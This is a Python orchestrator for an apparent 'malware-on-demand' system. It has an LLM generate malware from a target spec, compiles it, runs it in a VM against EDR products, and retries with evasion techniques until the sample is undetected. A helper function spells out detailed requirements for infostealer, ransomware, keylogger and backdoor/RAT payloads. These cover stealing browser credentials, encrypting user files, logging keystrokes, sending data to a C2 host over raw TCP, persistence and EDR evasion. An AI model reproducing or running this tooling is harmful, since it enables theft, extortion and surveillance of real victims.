"""
Full end-to-end orchestrator: spec → DB query → generation → VM provision → verify → loop → output.

This module ties together every phase into a single pipeline class with
configurable stages. Not all stages need to run — users can skip provisioning
if they already have a VM, or skip verification if they just want code gen.
"""

import asyncio
import logging
from pathlib import Path
from typing import Optional, Any

from .config_models import VMProvisionConfig, TargetOS, EDRConfig, BUILTIN_EDRS, get_edr_config
from .spec_parser import parse_target_spec
from .target_spec import TargetEnvironmentSpec, OSPlatform
from .db_query_engine import DBQueryEngine
from .generation_engine import GenerationEngine, GenerationResult, ErrorAnalyzer, FailureAnalysis, MalwarePlan
from .verifier import Verifier, VerificationResult, BehaviourCheck, ValidationPlan, ValidationCheck
from .loop_controller import LoopController, LoopResult
from .code_processor import source_filename
from .checkpoint import CheckpointManager, CheckpointState
from .debug_logger import DebugLogger

logger = logging.getLogger(__name__)


class PipelineError(Exception):
    """Raised when a pipeline stage fails."""
    pass


def _generate_behavior_spec(malware_type: str, c2_addr: str, c2_port: int) -> str:
    """Generate a detailed behavioral blueprint from the malware type string."""
    mt = malware_type.lower()

    if any(k in mt for k in ("info steal", "infostealer")):
        return (
            f"INFOSTEALER BEHAVIORAL REQUIREMENTS:\n"
            f"1. COLLECT: browser credential files — read Chrome Login Data "
            f"(%%LOCALAPPDATA%%\\Google\\Chrome\\User Data\\Default\\Login Data), "
            f"Firefox logins.json (%%APPDATA%%\\Mozilla\\Firefox\\Profiles\\*\\logins.json). "
            f"Use FindFirstFileA/FindNextFileA to locate profile dirs, ReadFile to read contents.\n"
            f"2. COLLECT: system info using ONLY Win32 API — hostname (GetComputerNameA), "
            f"username (GetUserNameA), OS version (GetVersionExA or RtlGetVersion), "
            f"running processes (CreateToolhelp32Snapshot + Process32First/Next). "
            f"NEVER use cmd.exe, tasklist.exe, systeminfo.exe, or any LOLBin for collection.\n"
            f"3. COLLECT: network info — IP addresses (GetAdaptersAddresses from iphlpapi.h), "
            f"active TCP connections (GetExtendedTcpTable), "
            f"mapped network drives (WNetOpenEnumA/WNetEnumResourceA).\n"
            f"4. COLLECT: interesting files from Desktop, Documents, Downloads — "
            f"recursively search for .txt, .doc, .docx, .pdf, .xls, .xlsx, .kdbx, .key, .pem, .csv files. "
            f"Read each file's first 4KB into a buffer.\n"
            f"5. EXFILTRATE via raw TCP ONLY: concatenate all collected data into a single buffer with "
            f"section markers (e.g. [SYSINFO], [BROWSER], [FILES], [NETWORK]). "
            f"Connect to {c2_addr}:{c2_port} via WSAStartup/socket/connect/send. "
            f"NEVER use curl.exe, certutil, powershell, or any LOLBin for exfiltration.\n"
            f"6. NO PERSISTENCE — infostealer is run-and-exit. Collect, exfil, cleanup, exit. "
            f"Do NOT write registry keys or copy to Startup folder.\n"
            f"7. EVASION: FreeConsole() at start, behavioral pacing with QueryPerformanceCounter, "
            f"decoy API calls between operations. Zero child process spawning.\n"
            f"8. MAIN must: FreeConsole, init winsock, collect ALL data "
            f"categories above using direct API calls, connect to C2, send each buffer, clean up, exit."
        )

    if "ransomware" in mt:
        return (
            f"RANSOMWARE BEHAVIORAL REQUIREMENTS:\n"
            f"1. Generate a random AES-256 key using CryptGenRandom.\n"
            f"2. Enumerate files in user profile (Desktop, Documents, Downloads, Pictures) "
            f"recursively using FindFirstFileA/FindNextFileA.\n"
            f"3. For each target file (.doc, .docx, .xls, .xlsx, .pdf, .txt, .jpg, .png, .ppt): "
            f"read contents with ReadFile, encrypt with generated key, write back, rename with .encrypted extension.\n"
            f"4. Drop a ransom note (README_DECRYPT.txt) in each encrypted directory.\n"
            f"5. MAIN must: generate key, enumerate and encrypt files, drop ransom notes, "
            f"optionally delete shadow copies if admin, exit."
        )

    if any(k in mt for k in ("keylog", "spyware")):
        return (
            f"KEYLOGGER BEHAVIORAL REQUIREMENTS:\n"
            f"1. CAPTURE: Use GetAsyncKeyState polling (10ms interval) in a loop. "
            f"Do NOT use SetWindowsHookExA — hooks appear in IAT and trigger EDR rules. "
            f"Use `GetAsyncKeyState(vk) & 1` to detect key presses.\n"
            f"2. LOG: Write keystrokes to an in-memory buffer with window titles "
            f"(GetForegroundWindow + GetWindowTextA). Manual VK-to-char mapping.\n"
            f"3. COLLECT: System info using ONLY Win32 API — GetComputerNameA, GetUserNameA, "
            f"GetVersionExA, GetAdaptersAddresses. NEVER spawn cmd.exe, tasklist, or any LOLBin.\n"
            f"4. EXFILTRATE: Every 30s, send buffered keystrokes to {c2_addr}:{c2_port} via raw TCP "
            f"(WSAStartup, socket, connect, send). NEVER use curl.exe or any LOLBin for exfil.\n"
            f"5. PERSIST via Startup folder — CopyFileA(self_path, CSIDL_STARTUP\\\\WindowsUpdate.exe). "
            f"Do NOT use HKCU Run key — EDR detects registry modification.\n"
            f"6. EVASION: FreeConsole() at start, behavioral pacing with QueryPerformanceCounter busy-wait, "
            f"decoy API calls (GetCursorPos, GetDesktopWindow) between operations.\n"
            f"7. MAIN must: FreeConsole, init winsock, collect system info (API only), start keylog loop, "
            f"periodically exfiltrate via raw TCP, persist, run indefinitely."
        )

    if any(k in mt for k in ("backdoor", "rat", "remote access", "c2", "reverse shell",
                              "command and control", "beacon")):
        return (
            f"BACKDOOR/RAT BEHAVIORAL REQUIREMENTS:\n"
            f"1. C2 BEACON: Connect to {c2_addr}:{c2_port} via raw TCP (WSAStartup, socket, connect). "
            f"Use a binary TLV protocol: 4-byte command ID (uint32_t) + 4-byte payload length (uint32_t) + payload. "
            f"Send heartbeat (cmd_id=0x01, payload=4 bytes GetTickCount) every 30 seconds.\n"
            f"2. COMMAND DISPATCH: Enter a recv loop. Read 8-byte TLV header, then payload_len bytes. "
            f"Switch on cmd_id to dispatch commands. After execution, send result back via same TLV format. "
            f"Built-in commands (all via Win32 API ONLY — ZERO child processes):\n"
            f"  - 0x02 sysinfo: GetComputerNameA, GetUserNameA, GetVersionExA, GetSystemInfo, GlobalMemoryStatusEx\n"
            f"  - 0x03 processes: CreateToolhelp32Snapshot + Process32First/Next\n"
            f"  - 0x04 filelist: FindFirstFileA/FindNextFileA on given directory\n"
            f"  - 0x05 fileread: CreateFileA/ReadFile (up to 512KB)\n"
            f"  - 0x06 filewrite: CreateFileA/WriteFile (path on first line, content after)\n"
            f"  - 0x07 screenshot: GetDC/BitBlt/GetDIBits → BMP in memory\n"
            f"  - 0x08 registry: RegOpenKeyExA/RegEnumValueA for HKLM/HKCU paths\n"
            f"  - 0x09 netinfo: GetAdaptersInfo + GetExtendedTcpTable\n"
            f"  - 0x0D exit: clean shutdown\n"
            f"3. RECONNECT: On recv/send error, closesocket, sleep with jitter (30-120s random via "
            f"GetTickCount() %% 90000 + 30000), then retry. Max 100 reconnect attempts with reset on success.\n"
            f"4. PERSIST via registry Run key (RegSetValueExA under HKCU\\Software\\Microsoft\\Windows\\"
            f"CurrentVersion\\Run) or Startup folder shortcut (CopyFileA to CSIDL_STARTUP).\n"
            f"5. EVASION: FreeConsole() at start, startup delay (3-15s jitter), behavioral pacing, "
            f"decoy API calls between operations. NEVER spawn cmd.exe, powershell, or any child process.\n"
            f"6. MAIN must: FreeConsole, startup delay, outer reconnect loop (connect → inner dispatch loop "
            f"→ on disconnect sleep+retry), persist on first successful connect, run indefinitely."
        )

    return ""


def _resolve_edr_configs(spec_edrs: list[str], test_all: bool = False) -> list[EDRConfig]:
    """Resolve spec EDR names to full EDRConfig objects.

    - If spec lists EDRs and all are available → use only those
    - If spec lists EDRs but any is unavailable → fall back to ALL available
    - If spec is empty or test_all=True → use ALL available
    """
    available = list(BUILTIN_EDRS.keys())

    if not spec_edrs or test_all:
        return [BUILTIN_EDRS[name] for name in available]

    clean = [e for e in spec_edrs if e and e.strip()]
    if not clean:
        return [BUILTIN_EDRS[name] for name in available]

    resolved = []
    all_available = True
    for name in clean:
        cfg = get_edr_config(name)
        if name not in BUILTIN_EDRS:
            all_available = False
        resolved.append(cfg)

    if not all_available:
        logger.warning(
            "Some EDRs in spec (%s) are not available — falling back to all available EDRs: %s",
            clean, available,
        )
        return [BUILTIN_EDRS[name] for name in available]

    return resolved


class MalwarePipeline:
    """End-to-end orchestrator for the full malware-on-demand workflow.

    Stages (all optional except spec loading):
      1. Parse target spec (always runs)
      2. Query databases (optional — skips if db_engine=None)
      3. Generate malware code (requires generation engine)
      4. Provision VM (requires provision config)
      5. Verify in VM (requires verifier + running VM)
      6. Retry loop with backoff

    Usage:
        pipeline = MalwarePipeline(...)
        result = await pipeline.run(spec_path="target.yaml", output_dir="./results")
    """

    def __init__(
        self,
        db_engine: Optional[DBQueryEngine] = None,
        generate: bool = True,
        provision_vm: bool = False,
        verify: bool = False,
        retry_loop: bool = False,
        max_iterations: int = 5,
        min_iterations: int = 1,
        exhaustive_mode: bool = False,
        debug: Optional[DebugLogger] = None,
        use_existing_vm: bool = False,
        existing_vm_port: int = 10022,
        existing_vm_user: str = "vmuser",
        existing_vm_pass: str = "vmuser123",
        run_mode: str = "local-run",    # "local-run" | "cloud-run"
        cloud_provider: str = "fugu",   # "fugu" | "openrouter"
        cloud_model: str = "",          # override provider default model
        llm_url: str = "",              # override local LLM API URL (auto-discovers 11235→11234→1234)
        llm_model: str = "",            # override local LLM model name
        plan_review_cycles: int = 10,   # 0 = loop until approved
        qemu_process=None,  # QEMUProcess ref for --boot-existing; enables snapshots
        resume: bool = False,
    ):
        self._generate = generate
        self._provision_vm = provision_vm
        self._verify = verify
        self._retry_loop = retry_loop
        self._debug = debug
        self._use_existing_vm = use_existing_vm
        self._existing_vm_port = existing_vm_port
        self._existing_vm_user = existing_vm_user
        self._existing_vm_pass = existing_vm_pass
        self._qemu_process = qemu_process
        self._cloud_provider = cloud_provider
        self._cloud_model = cloud_model
        self._llm_url = llm_url
        self._llm_model = llm_model
        self._plan_review_cycles = plan_review_cycles
        self._run_mode = run_mode
        self._resume = resume

        if generate and not db_engine:
            logger.info("DB engine auto-initialised for generation stage")
            db_engine = DBQueryEngine()

        # Stages that are always enabled
        self.engine = (
            GenerationEngine(
                db_engine=db_engine, debug=debug,
                run_mode=run_mode,
                cloud_provider=cloud_provider, cloud_model=cloud_model,
                llm_url=llm_url, llm_model=llm_model,
                plan_review_cycles=plan_review_cycles,
            )
            if generate else None
        )

        # Loop controller (Phase 5b)
        self.loop_ctrl = LoopController(
            max_iterations=max_iterations,
            min_iterations=min_iterations,
            exhaustive_mode=exhaustive_mode,
            debug=debug,
        )

    async def run(
        self,
        spec_path: str,
        output_dir: Optional[str] = None,
        vm_config: Optional[VMProvisionConfig] = None,
        source_file: Optional[str] = None,
        **spec_overrides: Any,
    ) -> "PipelineResult":
        """Execute the full pipeline.

        Parameters set which stages run:
            spec_path: Path to YAML/JSON target spec file
            output_dir: Where to write generated code and results
            vm_config: VMProvisionConfig for the provision stage
            source_file: Path to pre-existing source file (verify-only mode)
            **spec_overrides: Override fields from the spec file
        """
        output = Path(output_dir) if output_dir else None
        if output:
            output.mkdir(parents=True, exist_ok=True)

        _ckpt_mgr = CheckpointManager(output) if output else None
        _resumed_state: Optional[CheckpointState] = None
        _iteration_offset = 0

        if self._resume and _ckpt_mgr and _ckpt_mgr.has_checkpoint():
            _resumed_state = _ckpt_mgr.load()
            _iteration_offset = _resumed_state.completed_iterations
            logger.info(
                "Resuming from checkpoint — %d iterations completed, picking up from iteration %d",
                _iteration_offset, _iteration_offset + 1,
            )

        # -- Stage 0: Parse target spec (always runs) -----------------------
        logger.info("Loading target spec from %s", spec_path)
        try:
            target_spec = parse_target_spec(spec_path=spec_path, **spec_overrides)
            if self._debug and self._debug.enabled:
                self._debug.phase("SPEC")
                self._debug.dump_dict("parsed_spec", {
                    "os_platform": target_spec.os_platform.value,
                    "os_version": target_spec.os_version,
                    "edrs": target_spec.edrs or [],
                    "installed_compilers": target_spec.installed_compilers or [],
                    "custom_gates": target_spec.custom_gates or {},
                })
            _src_lang = getattr(target_spec, "source_language", "c") or "c"
            if _src_lang == "best":
                _src_lang = "c"  # TODO: dual-language comparison (generate C+Go, pick best evasion)
                target_spec.source_language = _src_lang
            # Auto-inject C2 address and detailed behavior spec for known malware types
            _mt = (getattr(target_spec, "malware_type", "") or "").lower()
            _c2_addr = getattr(target_spec, "c2_address", "10.0.2.2")
            _c2_port = getattr(target_spec, "c2_port", 9001)
            if any(k in _mt for k in ("keylog", "infostealer", "info steal", "rat", "backdoor", "spyware")):
                _c2_line = f"C2/exfiltration server: {_c2_addr}:{_c2_port} (send stolen data here via TCP)"
                if not target_spec.behavior_spec:
                    target_spec.behavior_spec = _c2_line
                elif _c2_addr not in target_spec.behavior_spec:
                    target_spec.behavior_spec = f"{target_spec.behavior_spec}\n{_c2_line}"
                logger.info("Auto-injected C2 config into behavior_spec: %s:%d", _c2_addr, _c2_port)
            if not target_spec.behavior_spec or len(target_spec.behavior_spec) < 200:
                _auto_spec = _generate_behavior_spec(_mt, _c2_addr, _c2_port)
                if _auto_spec:
                    existing = target_spec.behavior_spec or ""
                    target_spec.behavior_spec = f"{existing}\n{_auto_spec}" if existing else _auto_spec
                    logger.info("Auto-generated detailed behavior spec for %s", _mt)
            logger.info("Target spec loaded: %s (%s) lang=%s type=%s", target_spec.os_platform.value, target_spec.os_version, _src_lang, _mt)
        except Exception as e:
            raise PipelineError(f"Failed to load target spec: {e}") from e

        result = PipelineResult(
            target_spec=target_spec,
            output_dir=str(output) if output else None,
            generation_result=None,
            verification_results=[],
            loop_result=None,
        )

        # -- Stage 1: Generate malware (optional) ----------------------------
        gen_source = None
        _initial_plan: Optional[MalwarePlan] = None

        if not self._generate and self._verify:
            if source_file and Path(source_file).exists():
                gen_source = Path(source_file).read_text()
                logger.info("Loaded source for verify: %s (%d chars)", source_file, len(gen_source))
            elif output:
                _src_lang = target_spec.source_language.value if target_spec.source_language else "c"
                _src_file = output / source_filename(_src_lang)
                if _src_file.exists():
                    gen_source = _src_file.read_text()
                    logger.info("Loaded existing source for verify: %s (%d chars)", _src_file, len(gen_source))

        if self._generate and self.engine:
            logger.info("Generating malware...")
            try:
                gen_result = await self.engine.generate(target_spec)
                result.generation_result = gen_result

                if self._debug and self._debug.enabled:
                    self._debug.dump_dict("generation_result", {
                        "context_hash": gen_result.context_hash,
                        "prompt_length": gen_result.prompt_length,
                        "source_code_length": len(gen_result.source_code or ""),
                    })

                # Write source code to output dir
                if output and gen_result.source_code:
                    (output / source_filename(_src_lang)).write_text(gen_result.source_code)
                    logger.info("Source written to %s", output / source_filename(_src_lang))

                gen_source = gen_result.source_code
                _initial_plan = gen_result.plan
            except Exception as e:
                raise PipelineError(f"Generation failed: {e}") from e

        # -- Stage 1b: Generate behavioral validation plan -------------------
        # Done once here — reused across all verification loop iterations.
        # Generates commands to run post-execution to confirm the malware actually
        # did its job (e.g. keylog file exists, connection established, files encrypted).
        _validation_plan = None
        if self._verify and gen_source and self.engine:
            try:
                _validation_plan = await self.engine.generate_validation_plan(
                    target_spec, source_code=gen_source,
                )
                if _validation_plan.checks:
                    logger.info(
                        "Behavioral validation plan ready — %d checks",
                        len(_validation_plan.checks),
                    )
                else:
                    logger.warning(
                        "BEHAVIORAL VALIDATION UNAVAILABLE — no checks could be generated. "
                        "Any 'undetected' result will be treated as a functional failure until "
                        "the malware's effect can be verified."
                    )
                    _validation_plan = None
            except Exception as e:
                logger.warning("Validation plan generation failed (%s) — functional validation disabled", e)
                _validation_plan = None

        # -- Stage 1c: Restore from checkpoint if resuming ----------------------
        if _resumed_state:
            gen_source = _resumed_state.current_source
            if _resumed_state.plan:
                from .generation_engine import ComponentSpec
                _plan_data = _resumed_state.plan
                _initial_plan = MalwarePlan(
                    language=_plan_data.get("language", "c"),
                    includes=_plan_data.get("includes", []),
                    globals_code=_plan_data.get("globals_code", ""),
                    components=[ComponentSpec(**c) for c in _plan_data.get("components", [])],
                )
            if _resumed_state.validation_plan:
                _vp = _resumed_state.validation_plan
                _validation_plan = ValidationPlan(
                    checks=[ValidationCheck(**c) for c in _vp.get("checks", [])],
                    is_windows=_vp.get("is_windows", True),
                    setup_commands=_vp.get("setup_commands", []),
                )
            if _resumed_state.chunk_cache and hasattr(self.engine, '_chunk_cache'):
                self.engine._chunk_cache.update(_resumed_state.chunk_cache)
            logger.info("Checkpoint state restored — source=%d chars, plan=%s, validation=%s, chunk_cache=%d",
                        len(gen_source or ""),
                        "yes" if _initial_plan else "no",
                        f"{len(_validation_plan.checks)} checks" if _validation_plan else "no",
                        len(_resumed_state.chunk_cache) if _resumed_state.chunk_cache else 0)

        # -- Stage 2: Provision VM (optional) --------------------------------
        vm_instance = None
        if self._use_existing_vm:
            from .provision_engine import VMInstance, QEMUProcess
            _qemu = self._qemu_process
            if _qemu is None:
                _qmp_candidates = [
                    Path("/tmp/vm_provision/vm-windows-11.qmp"),
                    Path("/tmp/vm_provision/vm-linux.qmp"),
                ]
                for _qmp_path in _qmp_candidates:
                    if _qmp_path.exists():
                        _vm_stem = _qmp_path.stem.replace("vm-", "")
                        _disk_candidates = [p for p in _qmp_path.parent.glob("*.cow.qcow2") if _vm_stem in p.name]
                        if not _disk_candidates:
                            _disk_candidates = list(_qmp_path.parent.glob("*.cow.qcow2"))
                        _disk_img = _disk_candidates[0] if _disk_candidates else _qmp_path.parent / "disk.qcow2"
                        _qemu = QEMUProcess(
                            vm_name=_qmp_path.stem,
                            qmp_socket=_qmp_path,
                            disk_img=_disk_img,
                        )
                        _qemu.started = True
                        logger.info("Auto-detected QMP socket: %s (snapshots enabled)", _qmp_path)
                        break
            vm_instance = VMInstance(
                qemu=_qemu,
                vm_user=self._existing_vm_user,
                vm_pass=self._existing_vm_pass,
                ssh_port=self._existing_vm_port,
            )
            vm_instance.status = "running"
            result.vm_status = "running"
            result.ssh_port = self._existing_vm_port
            if _qemu:
                logger.info(
                    "Using existing VM at localhost:%d (user=%s) with QMP snapshots",
                    self._existing_vm_port, self._existing_vm_user,
                )
            else:
                logger.info("Using pre-existing VM at localhost:%d (user=%s, no QMP — snapshots disabled)", self._existing_vm_port, self._existing_vm_user)

        if not self._use_existing_vm and self._provision_vm and vm_config is None:
            # Auto-build a VMProvisionConfig from the parsed target spec so the
            # caller doesn't have to construct one manually.
            _os_map = {
                ("linux", "ubuntu-24.04"): TargetOS.UBUNTU_24_04,
                ("linux", "ubuntu-22.04"): TargetOS.UBUNTU_22_04,
                ("linux", "debian-bookworm"): TargetOS.DEBIAN_BOOKWORM,
                ("windows", "windows-11"): TargetOS.WINDOWS_11,
                ("windows", "windows-10"): TargetOS.WINDOWS_10,
            }
            _platform = target_spec.os_platform.value
            _version = target_spec.os_version.lower()
            _os_type = _os_map.get((_platform, _version))
            if _os_type is None:
                # Fallback: pick the most common OS for that platform
                _os_type = TargetOS.UBUNTU_24_04 if _platform == "linux" else TargetOS.WINDOWS_11
                logger.warning(
                    "Could not map os_version %r to a known TargetOS; defaulting to %s",
                    target_spec.os_version, _os_type.value,
                )
            vm_config = VMProvisionConfig(os_type=_os_type)
            vm_config.compute_paths()
            logger.info("Auto-built VMProvisionConfig for %s", _os_type.value)

        _snapshot_tag: Optional[str] = None

        if self._use_existing_vm and vm_instance and vm_instance.qemu:
            # Don't create snapshots on externally-managed VMs — restore_snapshot
            # shuts down QEMU which we can't restart (we don't own the process).
            logger.info("Skipping snapshot on existing VM (externally managed)")

        if not self._use_existing_vm and self._provision_vm and vm_config:
            logger.info("Provisioning VM...")
            try:
                from .provision_engine import ProvisionEngine
                engine = ProvisionEngine(daemonize=True)
                vm_instance = await engine.provision(vm_config, background=True)
                result.vm_status = "running"
                result.ssh_port = vm_instance.ssh_port if vm_instance else None
                if self._debug and self._debug.enabled:
                    self._debug.ok("VM provisioned")
                    if result.ssh_port:
                        self._debug.step("vm_info", f"SSH port: {result.ssh_port}")
                # Create a disk overlay so each loop iteration starts fresh.
                # blockdev-snapshot-sync routes all writes to an overlay file;
                # restore_snapshot() discards it and reboots from the clean base disk.
                try:
                    await vm_instance.save_snapshot("clean_state")
                    _snapshot_tag = "clean_state"
                    logger.info("Clean-state snapshot saved for iteration resets")
                    if self._debug and self._debug.enabled:
                        self._debug.ok("VM snapshot saved (iterations will reset to this state)")
                except Exception as snap_err:
                    logger.warning("Could not save VM snapshot — iterations will run on dirty state: %s", snap_err)
            except Exception as e:
                logger.warning("VM provisioning failed (continuing without VM): %s", e)
                result.vm_status = "failed"

        # -- Stage 3: Verify + Loop (optional) -------------------------------
        if self._verify and gen_source and vm_instance is None:
            if self._retry_loop:
                logger.warning(
                    "No VM available — running loop in local compilation-check mode "
                    "(no EDR/AV testing; verifies that generated code compiles cleanly)."
                )
            else:
                logger.error(
                    "VM provisioning failed — skipping verification. "
                    "Fix the provisioning error above, or set WIN11_ISO_PATH for Windows targets."
                )

        # Shared state: passes failure analysis + source + plan from verify → next generate
        if _resumed_state:
            _state: dict = {
                "last_analysis":      None,
                "last_source":        None,
                "last_plan":          _initial_plan,
                "fixed_source":       None,
                "failure_history":    list(_resumed_state.failure_history),
                "current_permissions": _resumed_state.current_permissions,
                "compile_fix_streak": _resumed_state.compile_fix_streak,
            }
        else:
            _state: dict = {
                "last_analysis":      None,
                "last_source":        None,
                "last_plan":          _initial_plan,
                "fixed_source":       None,
                "failure_history":    [],
                "current_permissions": "user",
                "compile_fix_streak": 0,
            }
        from .iteration_state import IterationState
        _iter_state = IterationState.load(output) if output else IterationState()
        _error_analyzer = ErrorAnalyzer(
            cloud_provider=self._cloud_provider,
            cloud_model=self._cloud_model,
            llm_url=self._llm_url,
            llm_model=self._llm_model,
            run_mode=self._run_mode,
        )

        # -- Stage 2b: Pre-loop compile check ------------------------------------
        # Cross-compile the generated source on the host BEFORE touching the VM.
        # Compile failures cost milliseconds here; inside the VM loop they cost
        # a full iteration + backoff each time.
        if gen_source and _error_analyzer.available:
            import shutil as _shutil
            _mingw = _shutil.which("x86_64-w64-mingw32-gcc")
            _is_win_target = (target_spec.os_platform.value == "windows")
            if _src_lang == "go":
                _preloop_cmd = f"go:build:{'windows' if _is_win_target else 'linux'}"
                _can_precheck = bool(_shutil.which("go"))
            elif _src_lang == "rust":
                _preloop_cmd = "rust:check"
                _can_precheck = bool(_shutil.which("rustc"))
            else:
                _preloop_cmd = None
                _can_precheck = bool(_mingw or not _is_win_target)
            if _can_precheck:
                from .verifier import verify_standalone, BehaviourCheck as _BC
                logger.info("Pre-loop compile check...")
                _precheck_src = gen_source
                _pre_ok = False
                for _attempt in range(3):
                    _pre = await verify_standalone(_precheck_src, target_spec, compile_cmd=_preloop_cmd, output_dir=output)
                    _pre_ok = _pre.behaviour_checks.get(_BC.COMPILATION_SUCCESS, False)
                    if _pre_ok:
                        logger.info("Pre-loop compile check: OK (attempt %d)", _attempt + 1)
                        break
                    logger.warning(
                        "Pre-loop compile check FAILED (attempt %d/3)%s",
                        _attempt + 1,
                        f":\n{_pre.compilation_output[:800]}" if _pre.compilation_output else "",
                    )
                    if _pre.compilation_output:
                        _fixed = await _error_analyzer.fix_compile_error(
                            _precheck_src, _pre.compilation_output,
                            language=_src_lang,
                        )
                        if _fixed:
                            _precheck_src = _fixed
                            logger.info("Pre-loop fix applied (%d chars) — re-checking", len(_fixed))
                        else:
                            logger.warning("Pre-loop fix_compile_error returned nothing — stopping pre-check")
                            break
                    else:
                        break
                if _pre_ok and _precheck_src is not gen_source:
                    gen_source = _precheck_src
                    logger.info("Pre-loop: using compiler-fixed source (%d chars)", len(gen_source))
                    if output:
                        (output / source_filename(_src_lang)).write_text(gen_source)
                elif not _pre_ok:
                    logger.warning(
                        "Pre-loop: source still does not compile after 3 fix attempts — "
                        "entering VM loop anyway (compile-fix will retry per iteration)"
                    )

        # Shared generate_fn used by both VM and local loop paths
        async def _generate_fn(spec, variant_seed="default"):
            if self.engine and gen_source is not None:
                # Fast path: compilation error was directly fixed — no LLM generation needed
                fixed = _state.get("fixed_source")
                if fixed:
                    _state["fixed_source"] = None
                    logger.info("Using compiler-fixed source directly (no re-generation)")
                    return fixed

                analysis: Optional[FailureAnalysis] = _state["last_analysis"]
                last_src: Optional[str]             = _state["last_source"]
                last_plan: Optional[MalwarePlan]    = _state["last_plan"]
                _state["last_analysis"] = None
                _state["last_source"]   = None

                # Archive current analysis into failure history before building context
                if analysis:
                    _state["failure_history"].append(
                        f"[Attempt {len(_state['failure_history']) + 1}] {analysis.patch_instructions or analysis.summary}"
                    )

                if analysis and last_src and not analysis.full_rewrite_needed and analysis.problem_functions:
                    # Patch mode: only rewrite the functions flagged by failure analysis
                    patched = await self.engine.patch_source(last_src, analysis, spec, plan=last_plan)
                    return patched or gen_source
                elif _state["failure_history"]:
                    history = _state["failure_history"]
                    logger.info("Rewrite: injecting %d accumulated failure(s) as context", len(history))
                    _iter_ctx = _iter_state.render_context()
                    accumulated = "\n\n".join(history)
                    if _iter_ctx:
                        accumulated = f"{_iter_ctx}\n\n{accumulated}"
                    if _iter_state.detection_history:
                        from .evasion_selector import EvasionSelector as _ES
                        _retry_evasions = _ES().select_evasions_for_retry(
                            spec, _iter_state.detection_history,
                            exhausted_strategies=_iter_state.evasion_strategies_exhausted,
                        )
                        if _retry_evasions:
                            _evasion_ctx = "\n## Recommended Evasion Techniques\n" + "\n".join(
                                f"- **{t.name}**: {t.description[:200]}" for t in _retry_evasions[:5]
                            )
                            accumulated = f"{accumulated}\n\n{_evasion_ctx}"
                            logger.info("Injected %d detection-aware evasion recommendations", len(_retry_evasions[:5]))
                    _state["compile_fix_streak"] = 0
                    vresult = await self.engine.generate_variant(
                        spec, variant_seed=variant_seed,
                        error_context=accumulated,
                        current_permissions=_state["current_permissions"],
                    )
                    _state["last_plan"] = vresult.plan
                    return vresult.source_code or gen_source
                else:
                    _state["compile_fix_streak"] = 0
                    vresult = await self.engine.generate_variant(
                        spec, variant_seed=variant_seed,
                        current_permissions=_state["current_permissions"],
                    )
                    _state["last_plan"] = vresult.plan
                    return vresult.source_code or gen_source
            return gen_source or ""

        async def _save_checkpoint(iteration, src, history):
            if not _ckpt_mgr:
                return
            from dataclasses import asdict as _asdict
            _plan_dict = None
            if _state["last_plan"]:
                _plan_dict = _asdict(_state["last_plan"])
            _vp_dict = None
            if _validation_plan:
                _vp_dict = {
                    "checks": [{"description": c.description, "command": c.command,
                                "success_pattern": c.success_pattern,
                                "negate": c.negate} for c in _validation_plan.checks],
                    "is_windows": _validation_plan.is_windows,
                    "setup_commands": _validation_plan.setup_commands,
                }
            from datetime import datetime
            _ckpt_mgr.save(CheckpointState(
                spec_path=spec_path,
                output_dir=str(output) if output else "",
                created_at=datetime.now().isoformat(),
                run_mode=self._run_mode,
                llm_url=self._llm_url,
                llm_model=self._llm_model,
                max_iterations=self.loop_ctrl.max_iterations,
                completed_iterations=iteration,
                iteration_history=[{
                    "iteration": r.iteration,
                    "detection_score": r.detection_score,
                    "failure_mode": r.failure_mode.value if r.failure_mode else None,
                    "alerts_count": r.alerts_count,
                } for r in history],
                last_analysis=None,
                failure_history=list(_state["failure_history"]),
                current_permissions=_state["current_permissions"],
                compile_fix_streak=_state["compile_fix_streak"],
                current_source=src,
                plan=_plan_dict,
                vm_port=self._existing_vm_port,
                vm_user=self._existing_vm_user,
                vm_pass=self._existing_vm_pass,
                validation_plan=_vp_dict,
                chunk_cache=dict(self.engine._chunk_cache) if hasattr(self.engine, '_chunk_cache') else {},
            ))

        if self._verify and gen_source and vm_instance is not None:
            verifier = Verifier(vm_instance=vm_instance, debug=self._debug, output_dir=output, source_language=_src_lang)
            _edr_configs = _resolve_edr_configs(
                getattr(target_spec, "edrs", []) or [],
            )
            if self._debug and self._debug.enabled:
                self._debug.phase("VERIFY+LOOP")
                self._debug.step("verifier_init", "Verifier created (VM=running)")
                self._debug.dump_dict("edr_configs", {c.name: c.detection_method for c in _edr_configs})

            async def _verify_fn(src_code: str) -> dict[str, Any]:
                try:
                    vresult = await verifier.verify(
                        source_code=src_code,
                        target_spec=target_spec,
                        timeout=60,
                        validation_plan=_validation_plan,
                        edr_configs=_edr_configs,
                    )
                    _compile_ok = vresult.behaviour_checks.get(BehaviourCheck.COMPILATION_SUCCESS, True)
                    _exec_ok = vresult.execution_exit_code == 0
                    result_dict = {
                        "detection_score":    vresult.detection_score.value,
                        "alerts_count":       len(vresult.alerts),
                        "compilation_failed": not _compile_ok,
                        "execution_crashed":  not _exec_ok,
                        "context_hash":       "",
                        "is_undetected":      vresult.is_undetected,
                        "functional_failed":  False,
                    }

                    # -- Behavioral validation (only when undetected and ran clean) --
                    _hardcoded_goal = vresult.behaviour_checks.get(
                        BehaviourCheck.FUNCTIONAL_GOAL_MET
                    )
                    if vresult.is_undetected and _compile_ok and _exec_ok:
                        _llm_passed = None
                        if _validation_plan is not None:
                            try:
                                _llm_passed = await verifier.run_validation_checks(_validation_plan)
                            except Exception as fve:
                                logger.warning("LLM behavioral validation error: %s", fve)

                        # Hardcoded type-specific checks are AUTHORITATIVE (canary-based ground truth).
                        # LLM checks only matter for types without hardcoded checks.
                        if _hardcoded_goal is not None:
                            if not _hardcoded_goal:
                                result_dict["functional_failed"] = True
                                vresult.functional_validation_passed = False
                                if _llm_passed:
                                    logger.warning(
                                        "Hardcoded behavioral check FAILED (canary files unchanged) — "
                                        "overriding LLM validation PASS. Malware did not accomplish its goal."
                                    )
                                else:
                                    logger.warning(
                                        "Behavioral validation FAILED — malware ran but produced no observable effect"
                                    )
                                if self._debug and self._debug.enabled:
                                    self._debug.fail("Behavioral validation: FAIL (hardcoded ground truth)")
                            else:
                                result_dict["functional_failed"] = False
                                vresult.functional_validation_passed = True
                                logger.info("Behavioral validation: PASS (hardcoded canary checks confirmed)")
                                if self._debug and self._debug.enabled:
                                    self._debug.ok("Behavioral validation: PASS (ground truth)")
                        elif _llm_passed is not None:
                            result_dict["functional_failed"] = not _llm_passed
                            vresult.functional_validation_passed = _llm_passed
